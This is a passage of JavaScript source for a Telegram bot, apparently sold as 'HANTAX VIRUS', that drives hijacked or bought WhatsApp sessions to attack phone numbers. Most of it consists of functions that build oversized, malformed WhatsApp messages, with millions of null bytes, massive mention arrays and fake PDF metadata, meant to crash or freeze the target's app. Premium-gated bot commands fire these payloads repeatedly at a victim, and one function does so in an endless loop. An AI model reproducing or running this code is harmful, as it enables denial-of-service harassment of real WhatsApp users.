        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
          isForwarded: true,
          forwardingScore: 999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, n) => ({
              participant: `62${n + 829599}@s.whatsapp.net`
            }))
          },
        },
      },
    },
  },
}, { participant: { jid: target }});
}
}

async function epcihDiley(sock, target) {
    try {
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: {
                        extendedTextMessage: {
                            text: "$",
                            matchedText: "https://t.me/FlavourKelra",
                            description: "$",
                            title: "$",
                            paymentLinkMetadata: {
                                button: {
                                    displayText: "#",
                                },
                                header: {
                                    headerType: 1,
                                },
                                provider: {
                                    paramsJson: "{{".repeat(120000),
                                },
                            },
                            linkPreviewMetadata: {
                                paymentLinkMetadata: {
                                    button: {
                                        displayText: "@jule",
                                    },
                                    header: {
                                        headerType: 1,
                                    },
                                    provider: {
                                        paramsJson: "{{".repeat(120000),
                                    },
                                },
                                urlMetadata: {
                                    fbExperimentId: 999,
                                },
                                fbExperimentId: 888,
                                linkMediaDuration: 555,
                                socialMediaPostType: 1221,
                                videoContentUrl: "https://wa.me/settings/linked_devices#,,jule",
                                videoContentCaption: "@jule",
                            },
                            contextInfo: {
                                isForwarded: true,
                                forwardingScore: 999,
                                quotedMessage: {
                                    locationMessage: {
                                        degreesLatitude: 9.999999919991,
                                        degreesLongitude: -999999999999,
                                        accuracyInMeters: 1
                                    }
                                }
                            }
                        }
                    }
                }
            },
            { participant: { jid: target } }
        );
        
        let parse = true;
        let SID = "5e03e0";
        let key = "10000000_2203140470115547_947412155165083119_n.enc";
        let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
        let type = `image/webp`;
        if (11 > 9) {
            parse = parse ? false : true;
        }

        const stc = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
                        fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
                        fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
                        mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
                        mimetype: type,
                        directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
                        fileLength: {
                            low: Math.floor(Math.random() * 1000),
                            high: 0,
                            unsigned: true,
                        },
                        mediaKeyTimestamp: {
                            low: Math.floor(Math.random() * 1700000000),
                            high: 0,
                            unsigned: false,
                        },
                        firstFrameLength: 19904,
                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
                        isAnimated: true,
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            groupMentions: [],
                            entryPointConversionSource: "non_contact",
                            entryPointConversionApp: "whatsapp",
                            entryPointConversionDelaySeconds: 467593,
                        },
                        stickerSentTs: {
                            low: Math.floor(Math.random() * -20000000),
                            high: 555,
                            unsigned: parse,
                        },
                        isAvatar: parse,
                        isAiSticker: parse,
                        isLottie: parse,
                    },
                },
            },
        }, {});

        const jawir = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "#",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_request"
                    },
                },
            },
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
        });

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: stc.message,
            },
        }, {
            messageId: stc.key.id,
            participant: { jid: target },
        });

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: jawir.message,
            },
        }, {
            messageId: jawir.key.id,
            participant: { jid: target },
        });

    } catch (err) {
        console.error("error:", err);
    }
}

async function galaxyMessage(sock, target) {
    while (true) {
        try {
            const msg = await generateWAMessageFromContent(
                target,
                {
                    groupStatusMessageV2: {
                        message: {  
                            interactiveResponseMessage: {
                                body: {
                                    text: "arc",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "galaxy_message",
                                    paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(999999)}\"}}`,
                                    version: 3
                                }
                            }
                        }
                    }
                },
                { userJid: sock.user.id } 
            );

            await sock.relayMessage(
                target,
                msg.message,
                {
                    messageId: msg.key.id,
                    participant: { jid: target }
                }
            );

            console.log(`👻 Arc Arc ke ${target} (Looping Active)`);

            await new Promise(resolve => setTimeout(resolve, 1000));

        } catch (err) {
            console.error("❌ Error dalam Loop:", err);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}

async function FrezeChatAh(sock, target) {
  await sock.relayMessage(target, {
     interactiveResponseMessage: {
        body: {
          text: "try ya plerr",
          format: 1
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"wa_flow_response_params\":{\"title\":${"𑇂𑆵𑆴𑆿".repeat(60000)}}}`,
          version: 3,
        }
     }
  }, { participant: { jid: target } });
}

async function Delayin(sock, target) {
    let k = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let z = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
               "#" +
               Math.floor(Math.random() * 16777215)
               .toString(16)
               .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        k.message,
        {
            messageId: k.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        z.message,
        {
            messageId: z.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}

async function otaxnewdocu(sock, target) {
console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
let docu = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/519762707_740185715084744_4977165759317976923_n.enc?ccb=11-4&oh=01_Q5Aa2AGzO7QTWKQKGXCBsP0s3FvW_1wqm1IJe-Hr7RSJGPOnrQ&oe=689A12CF&_nc_sid=5e03e0&mms3=true",
    "mimetype": "application/pdf",
    "fileSha256": "8bm4IyAXVv+iqbrtXIJ32ZgCL6al2mnpewvrMwrqSz8=",
    "fileLength": "999999999",
    "pageCount": 92828282882,
    "mediaKey": "5y/wRwOnBCEEMh6pBBNztHFAROZDvBEuX6lZI3orfQE=",
    "fileName": "҉‼️⃟̊‼️⃟̊҈⃝⃞⃟⃠⃤꙰꙲꙱‼️⃟̊𝕻𝖊𝖑𝖊𝖗𝖀𝖗𝖎𝖕𝕺𝖙𝖆𝖝∮⸙⸎.pdf",
    "fileEncSha256": "YgCZHWxMaT0PNGhbyPJvIqeEdicCUeJF7ooUgz3VVyY=",
    "directPath": "/v/t62.7119-24/519762707_740185715084744_4977165759317976923_n.enc?ccb=11-4&oh=01_Q5Aa2AGzO7QTWKQKGXCBsP0s3FvW_1wqm1IJe-Hr7RSJGPOnrQ&oe=689A12CF&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1752349203",
    "contactVcard": true,
    "thumbnailDirectPath": "/v/t62.36145-24/30978706_624564333438537_9140700599826117621_n.enc?ccb=11-4&oh=01_Q5Aa2AEuw_7H8iAXcpyYOnG8a_u8lGKh-YjLq4XAzWQvsXQlzw&oe=689A2103&_nc_sid=5e03e0",
    "thumbnailSha256": "xPYGe7EjjF+blg7XiQr8G2emJFmMbyOrSVZIW0WJxuo=",
    "thumbnailEncSha256": "BT9gu5nq/bR0TvUJnrscK8/RW+24cNMy1VGILh0zUdk=",
    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
    "contextInfo": {
      "expiration": 1,
      "ephemeralSettingTimestamp": 1,
      "forwardingScore": 9999,
      "isForwarded": true,
      "remoteJid": "status@broadcast",
      "disappearingMode": {
        "initiator": "INITIATED_BY_OTHER",
        "trigger": "UNKNOWN_GROUPS"
      },
      "StatusAttributionType": 1,
      "forwardedAiBotMessageInfo": {
         "botName": "Meta",
          "botJid": "13135550002@s.whatsapp.net",
          "creatorName": "otax"
      },
      "externalAdReply": {
          "showAdAttribution": false,
          "renderLargerThumbnail": true
      },
      "quotedMessage": {
        "paymentInviteMessage": {
          "serviceType": 1,
          "expiryTimestamp": null
        }
      }
    },
    "thumbnailHeight": 480,
    "thumbnailWidth": 339,
    "caption": "ꦽ".repeat(150000)
  }
	}), { participant: { jid: target }
});

  await sock.relayMessage(target, docu.message, { messageId: docu.key.id });
}

async function otaxnewdocu2(sock, target) {
console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
let docu = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/519762707_740185715084744_4977165759317976923_n.enc?ccb=11-4&oh=01_Q5Aa2AGzO7QTWKQKGXCBsP0s3FvW_1wqm1IJe-Hr7RSJGPOnrQ&oe=689A12CF&_nc_sid=5e03e0&mms3=true",
    "mimetype": "application/pdf",
    "fileSha256": "8bm4IyAXVv+iqbrtXIJ32ZgCL6al2mnpewvrMwrqSz8=",
    "fileLength": "999999999",
    "pageCount": 92828282882,
    "mediaKey": "5y/wRwOnBCEEMh6pBBNztHFAROZDvBEuX6lZI3orfQE=",
    "fileName": "҉‼️⃟̊‼️⃟̊҈⃝⃞⃟⃠⃤꙰꙲꙱‼️⃟̊𝕻𝖊𝖑𝖊𝖗𝖀𝖗𝖎𝖕𝕺𝖙𝖆𝖝∮⸙⸎.pdf",
    "fileEncSha256": "YgCZHWxMaT0PNGhbyPJvIqeEdicCUeJF7ooUgz3VVyY=",
    "directPath": "/v/t62.7119-24/519762707_740185715084744_4977165759317976923_n.enc?ccb=11-4&oh=01_Q5Aa2AGzO7QTWKQKGXCBsP0s3FvW_1wqm1IJe-Hr7RSJGPOnrQ&oe=689A12CF&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1752349203",
    "contactVcard": true,
    "thumbnailDirectPath": "/v/t62.36145-24/30978706_624564333438537_9140700599826117621_n.enc?ccb=11-4&oh=01_Q5Aa2AEuw_7H8iAXcpyYOnG8a_u8lGKh-YjLq4XAzWQvsXQlzw&oe=689A2103&_nc_sid=5e03e0",
    "thumbnailSha256": "xPYGe7EjjF+blg7XiQr8G2emJFmMbyOrSVZIW0WJxuo=",
    "thumbnailEncSha256": "BT9gu5nq/bR0TvUJnrscK8/RW+24cNMy1VGILh0zUdk=",
    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
    "contextInfo": {
      "expiration": 1,
      "ephemeralSettingTimestamp": 1,
      "forwardingScore": 9999,
      "isForwarded": true,
      "remoteJid": "status@broadcast",
      "disappearingMode": {
        "initiator": "INITIATED_BY_OTHER",
        "trigger": "UNKNOWN_GROUPS"
      },
      "StatusAttributionType": 1,
      "forwardedAiBotMessageInfo": {
         "botName": "Meta",
          "botJid": "13135550002@s.whatsapp.net",
          "creatorName": "otax"
      },
      "externalAdReply": {
          "showAdAttribution": false,
          "renderLargerThumbnail": true
      },
      "quotedMessage": {
        "paymentInviteMessage": {
          "serviceType": 1,
          "expiryTimestamp": null
        }
      }
    },
    "thumbnailHeight": 480,
    "thumbnailWidth": 339,
    "caption": "ꦾ".repeat(150000)
  }
	}), { participant: { jid: target }
});

  await sock.relayMessage(target, docu.message, { messageId: docu.key.id });
}
//---------------------------------------END FUNCT---------------------------------------------------\\

// NGAPAIN DI MT MANAGER BG 🤔

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}
const bugRequests = {};
// 1. Fungsi untuk mengambil style secara acak
// Map untuk menampung interval agar bisa dihentikan saat pesan dihapus
const buttonIntervals = new Map();

// Handler Menu Utama supaya bisa dipanggil di /start dan back_to_main
async function sendStartMenu(chatId, from) {
  const userId = from.id;
  const username = from.username ? `@${from.username}` : "Tidak ada username";
  const randomImage = getRandomImage();

  const styles = ["primary", "success", "danger"];
  let index = 0;

  const keyboard = [
    [
      { text: "XBUGS", callback_data: "trashmenu", style: styles[index] },
      { text: "XSETTINGS", callback_data: "owner_menu", style: styles[index] }
    ],
    [
      { text: "TOOLS", callback_data: "tols", style: styles[index] },
      { text: "Developer", url: "https://t.me/GabreilRey", style: styles[index] }
    ]
  ];

  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote><strong>𝗛𝗔𝗡𝗧𝗔𝗫 𝗩𝗜𝗥𝗨𝗦</strong></blockquote>
↯ Developer  : @GabreilRey
↯ Version    : 2͒.͠0͢ 𝑽͒𝑽͠𝑽͢𝑰͒𝑷͢ 𝑩͒𝒖͠𝒚͢
↯ Platform   : Telegram
↯ type script : Bebas spam bugs

<blockquote><strong>𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍</strong></blockquote>
↯ ID: ${userId}
↯ Username: ${username}

<blockquote><strong>𝐒𝐄𝐍𝐃𝐄𝐑 𝐒𝐓𝐀𝐓𝐔𝐒</strong></blockquote>
↯ Koneksi: ${sessions.size}
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: keyboard
    }
  });

  const messageId = sent.message_id;

  const intervalId = setInterval(async () => {
    index++;
    if (index >= styles.length) {
    index = 0;
  }

    const newKeyboard = [
      [
        { text: "XBUGS", callback_data: "trashmenu", style: styles[index] },
        { text: "XSETTINGS", callback_data: "owner_menu", style: styles[index] }
      ],
      [
        { text: "TOOLS", callback_data: "tols", style: styles[index] },
        { text: "Developer", url: "https://t.me/GabreilRey", style: styles[index] }
      ]
    ];

    try {
      await bot.editMessageReplyMarkup(
        { inline_keyboard: newKeyboard },
        {
          chat_id: chatId,
          message_id: messageId
        }
      );
    } catch (e) {
      clearInterval(intervalId);
    }
  }, 2000);

  buttonIntervals.set(messageId, intervalId);
}

// Handler Utama
bot.onText(/\/start/, async (msg) => {
  await sendStartMenu(msg.chat.id, msg.from);
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const runtime = getBotRuntime();
    const data = query.data;

    // 1. Matikan interval lama agar tidak error
    if (buttonIntervals.has(messageId)) {
      clearInterval(buttonIntervals.get(messageId));
      buttonIntervals.delete(messageId);
    }

    // 2. Hapus pesan lama
    await bot.deleteMessage(chatId, messageId).catch(() => {});

    let caption = "";
    let replyMarkup = {};
    let selectedImage = ""; // Variabel foto tiap menu

    if (data === "trashmenu") {
  selectedImage = "https://files.catbox.moe/4arlxn.jpg";
  caption = `<blockquote>𝗛𝗔𝗡𝗧𝗔𝗫 𝗩𝗜𝗥𝗨𝗦</blockquote>
↯ Developer : @GabreilRey
↯ Version   : 2͒.͠0͢ 𝑽͒𝑽͠𝑽͢𝑰͒𝑷͢ 𝑩͒𝒖͠𝒚͢
↯ Platform  : Telegram
↯ Script    : Bebas spam bugs & No Spam

<b>𝑲͒𝒉͠𝒖͢𝒔͒𝒖͠𝒔 𝑴͒𝒖͢𝒓͒𝒃͢𝒖𝒈͢</b>
⌬ /mention - 628xxx (Bebas Spam)
⌬ /invisible - 628xxx (Bebas Spam)
⌬ /delayhard - 628xxx (Bebas Spam)
⌬ /delayspam - 628xxx (Bebas Spam)
⌬ /Xmurbug - 628xxx (Bebas Spam)
<b>𝑭͒𝒓͠𝒆͢𝒆𝒛͒𝒆𝑪͒𝒉͢𝒂𝒕</b>
⌬ /FrezeChat - 628xxx (Usahakan Jeda)
<b>𝑩͒𝒍͠𝒂͢𝒏͒𝒌͢ 𝑯͒𝒂͠𝒓͢𝒅͒</b>
⌬ /OtaxBlank - 628xxx (Jangan Spam)
⌬ /OtaxBlankv2 - 628xx (Jangan Spam)`;

  replyMarkup = {
    inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main", style: "success" }]],
  };
} 
    
    else if (data === "owner_menu") {
  selectedImage = "https://files.catbox.moe/4arlxn.jpg";
  caption = `<blockquote>𝗛𝗔𝗡𝗧𝗔𝗫 𝗩𝗜𝗥𝗨𝗦</blockquote>
↯ Developer : @GabreilRey
↯ Version   : 2͒.͠0͢ 𝑽͒𝑽͠𝑽͢𝑰͒𝑷͢ 𝑩͒𝒖͠𝒚͢
↯ Platform  : Telegram
↯ Script    : Bebas spam bugs & No Spam

<blockquote><b>AKSES PEMILIK</b></blockquote>
/addowner
/delowner
/addadmin
/deladmin
/addprem
/delprem
/setcd
/addsender
/listbot

<blockquote><b>AKSES OWNER</b></blockquote>
/addadmin
/deladmin
/addprem
/delprem
/setcd
/addsender
/listbot

<blockquote><b>AKSES ADMIN</b></blockquote>
/addprem
/delprem
/setcd
/addsender
/listbot

<b>𝑴͒𝑬͠𝑵͢𝑼 𝑴͒𝑼͠𝑹͢𝑩͒𝑼͢𝑮</b>
/update`;

  replyMarkup = {
    inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main", style: "primary" }]],
  };
}
    
    else if (data === "tols") {
  selectedImage = "https://files.catbox.moe/4arlxn.jpg";
  caption = `<blockquote>𝗛𝗔𝗡𝗧𝗔𝗫 𝗩𝗜𝗥𝗨𝗦</blockquote>
↯ Developer : @GabreilRey
↯ Version   : 2͒.͠0͢ 𝑽͒𝑽͠𝑽͢𝑰͒𝑷͢ 𝑩͒𝒖͠𝒚͢
↯ Platform  : Telegram
↯ Status    : Private
↯ Runtime   : ${runtime}

<blockquote><b>TOOLS MENU</b></blockquote>
/SpamPairing
/SpamCall
/hapusbug
/SpamReportWhatsapp

<blockquote><b>FUN MENU</b></blockquote>
/tourl
/brat
/info`;

  replyMarkup = {
    inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main", style: "danger" }]],
  };
}
    
    else if (data === "back_to_main") {
      await sendStartMenu(chatId, query.from);
      return await bot.answerCallbackQuery(query.id);
    }

    // 3. Send pesan baru dengan foto spesifik dan teks lengkap
    if (caption !== "" && selectedImage !== "") {
      await bot.sendPhoto(chatId, selectedImage, {
        caption: caption,
        parse_mode: "HTML",
        reply_markup: replyMarkup
      });
    }

    await bot.answerCallbackQuery(query.id);

  } catch (err) {
    console.error("Error Callback:", err.message);
  }
});




//=======CASE BUG=========//
bot.onText(/\/FcSuper(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/GabreilDitzforever" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /FcSuper 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://imgbox.com/GGp1aJ4E",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗪𝗢𝗟𝗞𝗘𝗥 𝗖𝗥𝗔𝗦𝗛 BUG SYSTEM 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : SUPER FORCLOSE
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note: Jeda 20 menit agar sender tidak overheat</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 3; i++) {
          await X7Force(target);
          await X7Force(target);
          await X7Force(target);
          await X7Force(target);
          await X7Force(target);
          await X7Force(target);
          await sleep (200);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[𝗪𝗢𝗟𝗞𝗘𝗥 𝗖𝗥𝗔𝗦𝗛] DelayXHard: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug DelayXHard selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗪𝗢𝗟𝗞𝗘𝗥 𝗖𝗥𝗔𝗦𝗛 BUG SYSTEM 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : SUPER FORCLOSE
▹ Status : Success 
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("ForceSuper Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("ForceSuper ERROR:", error);
  }
});

//=======CASE BUG 2=========//
bot.onText(/\/CrashBussines(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/GabreilDitzforever" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /FcXdelay 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendMessage(chatId, `
<blockquote>
⬡═—⊱「 𝗪𝗢𝗟𝗞𝗘𝗥 𝗖𝗥𝗔𝗦𝗛 BUG SYSTEM 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Crash Business
▹ Status : Success
▹ Date : ${date}
</blockquote>
`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    })

    setTimeout(async () => {
      try {

        for (let i = 0; i < 100; i++) {
          await CrashBusiness(sock, target);
          await CrashBusiness(sock, target);
          await CrashBusiness(sock, target);
          await CrashBusiness(sock, target);
          await CrashBusiness(sock, target);
          await sleep(2000);
        }

        console.log(`[SUCCESS] Fc X Delay ${formattedNumber}`)

      } catch (err) {
        console.log("Crash business error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Crash business ERROR:", err)
  }
});

//=======CASE BUG 3=========//
bot.onText(/\/CrashInvis(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/GabreilDitzforever" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /CrashInvis 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendMessage(chatId, `
\`\`\`JavaScript
